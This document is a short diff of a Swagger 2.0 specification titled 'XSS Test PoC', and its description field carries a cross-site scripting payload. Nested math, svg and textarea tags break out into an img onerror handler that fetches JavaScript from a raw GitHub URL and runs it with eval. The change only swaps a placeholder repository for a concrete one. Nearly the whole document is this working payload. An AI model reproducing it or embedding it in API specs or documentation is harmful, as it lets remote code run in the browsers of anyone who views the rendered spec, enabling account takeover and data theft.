@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
   title: XSS Test PoC
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/payload.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/staretz/test-swg/refs/heads/main/payload.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: 1.0.0
 paths: {}
